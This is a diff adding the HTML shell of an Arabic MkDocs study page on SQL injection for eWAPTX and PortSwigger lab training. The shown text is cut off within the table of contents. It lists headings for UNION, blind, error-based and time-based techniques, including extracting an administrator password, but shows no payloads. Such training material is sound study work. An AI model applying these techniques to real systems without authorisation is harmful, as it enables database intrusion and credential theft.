@@ -1,0 +1,6190 @@
+
+<!doctype html>
+<html lang="ar" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../5-Oauth%20portswigger/">
+      
+      
+        <link rel="next" href="../7-Blind%20Sql%20Injection/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>6 SQL INJECTION - eWAPTX Zero-Day Notes</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto+Mono:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto Mono";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../stylesheets/hacker_style.css">
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="rtl" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="lime">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#1-sql-injection" class="md-skip">
+          انتقل إلى المحتوى
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="عنوان العارضة">
+    <a href=".." title="eWAPTX Zero-Day Notes" class="md-header__button md-logo" aria-label="eWAPTX Zero-Day Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            eWAPTX Zero-Day Notes
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              6 SQL INJECTION
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="بحث" placeholder="بحث" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="إبحث">
+        
+        <button type="reset" class="md-search__icon md-icon" title="مسح كلي" aria-label="مسح كلي" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            بدء البحث
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="تصفح" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="eWAPTX Zero-Day Notes" class="md-nav__button md-logo" aria-label="eWAPTX Zero-Day Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    eWAPTX Zero-Day Notes
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Welcome to MkDocs
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1-EWAPTX/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    1 EWAPTX
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../2-EWAPTX%20%28part%202%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2 EWAPTX (part 2)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../3-Enumeration%20%26%20Brute%20force/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Authentication Enumeration — الفكرة ببساطة
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../4-JWT%20port_swigger/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ليه JWT vulnerabilities خطيرة جداً ؟
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../5-Oauth%20portswigger/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    5 Oauth portswigger
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    6 SQL INJECTION
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    6 SQL INJECTION
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="جدول المحتويات">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      جدول المحتويات
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-sql-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. ما هي ثغرة حقن قواعد البيانات (SQL Injection)؟
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. ما هو السبب الجذري للثغرة؟
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-prerequisites" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. شروط حدوث الثغرة (Prerequisites)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-cia" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. التأثير على أمن المعلومات (مثلث CIA)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. عواقب إضافية متقدمة
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-owasp-top-10" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6. تصنيف وتقييم الثغرة حسب (OWASP Top 10)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7. نبذة تاريخية وأشهر الاختراقات
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sql-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        التصنيف الأساسي لثغرات SQL Injection
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="التصنيف الأساسي لثغرات SQL Injection">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-in-band-sqli" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. الحقن المباشر (In-band SQLi)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-blind-sqli" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. الحقن الأعمى (Blind SQLi)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-out-of-band-sqli" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. الحقن خارج النطاق (Out-of-band SQLi)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#examining-the-database-in-sql-injection-attacks" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Examining the database in SQL injection attacks
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. استعلامات معرفة نوع وإصدار قاعدة البيانات
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-the-payload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. شرح كود الاستغلال العملي (The Payload)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-output" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. تحليل النتيجة المرتجعة (Output)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#listing-the-contents-of-the-database" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Listing the contents of the database
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1-information-schema" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. ما هو الـ Information Schema؟
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-tables" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. الكود الأول: استخراج أسماء الجداول (Tables)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-columns" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. الكود الثاني: استخراج أسماء الأعمدة (Columns)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#listing-the-contents-of-an-oracle-database" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Listing the contents of an Oracle database
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1-tables-oracle" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. استخراج أسماء الجداول (Tables) في Oracle
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-columns-oracle" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. استخراج أسماء الأعمدة (Columns) في Oracle
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2. استخراج أسماء الأعمدة (Columns) في Oracle">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#in-band-types" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        IN-BAND types :
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1-union-union-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. ما هو هجوم الـ UNION (UNION Attack)؟
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#order-by" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        الطريقة الأولى: استخدام ORDER BY
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#union-select-null" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        الطريقة الثانية: استخدام UNION SELECT NULL
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#database-specific-syntax" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Database-specific syntax :
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1-database-specific-syntax" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. الفروق في صيغ قواعد البيانات (Database-specific syntax)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-finding-columns-with-a-useful-data-type" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. البحث عن عمود يقبل النصوص (Finding columns with a useful data type)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#using-a-sql-injection-union-attack-to-retrieve-interesting-data" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Using a SQL injection UNION attack to retrieve interesting data :
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. متى يمكنك استخراج البيانات؟
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. السيناريو الافتراضي للاستغلال
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-the-payload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. كود الاستغلال النهائي (The Payload)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#retriving-multiple-values-within-a-single-column" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Retriving multiple values within a single column:
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1-concatenation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. فكرة دمج النصوص (Concatenation)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-oracle" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. شرح كود الاستغلال في Oracle
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-output_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. تحليل النتيجة المرتجعة (Output)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💡 تلميحة تقنية مهمة (فروق صيغ قواعد البيانات الأخرى):
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#blind-sql-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blind sql injection :
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1-blind-sqli-union" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. ما هو الحقن الأعمى (Blind SQLi) ولماذا يفشل الـ UNION هنا؟
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-conditional-responses" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. سيناريو الاستغلال عبر الاستجابة المشروطة (Conditional Responses)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-logic-probing" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. شرح أكواد اختبار المنطق (Logic Probing)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-data-extraction" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. شرح أكواد استخراج البيانات (Data Extraction)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4. شرح أكواد استخراج البيانات (Data Extraction)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#substring" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        فهم دالة SUBSTRING أولاً:
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        تحليل الأكواد المحقونة خطوة بخطوة:
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ماذا يحدث بعد ذلك؟
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#substring_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        تركيبة دالة SUBSTRING
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        مثال للتوضيح:
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#limit-offset" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        الحل: استخدام LIMIT و OFFSET
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="الحل: استخدام LIMIT و OFFSET">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        شكل الكود الصحيح (المفاهيمي):
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#the-iteration-process" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        إزاي تتحرك جوه البيانات؟ (The Iteration Process)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. ما هو الحقن المبني على الأخطاء؟
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-10" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. الخدعة الرياضية: القسمة على صفر (1/0)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-payloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. تحليل أكواد الاستغلال (Payloads)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-data-extraction_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. دمج التكتيك لاستخراج البيانات (Data Extraction)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        الخطوة 1: معرفة طول (عدد حروف) اسم أول جدول
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        الخطوة 2: استخراج اسم أول جدول (حرفاً بحرف)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-oracle" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        الخطوة 3: كيف ننتقل لاسم الجدول الثاني؟ (الخدعة في Oracle)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#blind-sql-injection-with-conditional-errors-lab" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blind SQL injection with conditional errors LAB:
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#recon-fingerprinting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        المرحلة الأولى: الاستكشاف وبصمة القاعدة (Recon &amp; Fingerprinting)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        المرحلة الثانية: تأكيد الهدف
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        المرحلة الثالثة: بناء "السلاح" (الخطأ المشروط)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#repeater" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        المرحلة الرابعة: استخراج طول كلمة المرور (Repeater)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#intruder" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        المرحلة الخامسة: استخراج الباسورد بالكامل (Intruder)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. كود الفحص الأولي وكسر السياق
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-fingerprinting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. أكواد تحديد نوع قاعدة البيانات (Fingerprinting)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. كود كشف جدول المستخدمين
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. كود اختبار "السلاح" (الخطأ المشروط)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-administrator" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. كود كشف حساب الـ Administrator
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6. كود استخراج طول كلمة المرور
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-intruder" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7. كود استخراج الحروف (مرحلة الـ Intruder)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#extracting-sensitive-data-via-verbose-sql-error-messagesextracting-sensitive-data-via-verbose-sql-error-messages" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Extracting sensitive data via verbose SQL error messagesExtracting sensitive data via verbose SQL error messages:
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1-verbose-errors-query-structure" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. كشف بنية الاستعلام (Verbose Errors &amp; Query Structure)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-error-based-extraction" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. استخراج البيانات باستخدام رسائل الخطأ (Error-Based Extraction)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-bypassing-character-limits" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. تخطي حدود الحروف (Bypassing Character Limits)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#visible-error-based-sql-injection-lab" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Visible error-based SQL injection LAB:
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1-backend" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. تحليل ما حدث في الـ Backend
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-payload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. أين تكمن المشكلة في هذا الـ Payload؟
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-payload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. الحل والـ Payload الصحيح
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1-id" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. تخلص من الـ ID الأصلي
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. احذف المسافات غير الضرورية
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#payloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        أقصر Payloads يمكنك تجربتها:
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        نصيحة سريعة أثناء التطبيق:
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        لماذا ظهر هذا الخطأ؟
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        كيف نصلح ذلك؟
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#payloads_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        الـ Payloads الصحيحة (جربها الآن):
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploiting-blind-sql-injection-by-triggering-time-delays" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exploiting blind SQL injection by triggering time delays:
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1-the-core-concept" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. الفكرة العبقرية خلف الوقت (The Core Concept)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-sql-server" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. تحليل أمثلة الـ SQL Server
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-data-extraction" class="md-nav__link">
+    <span class="md-ellipsis">
+      
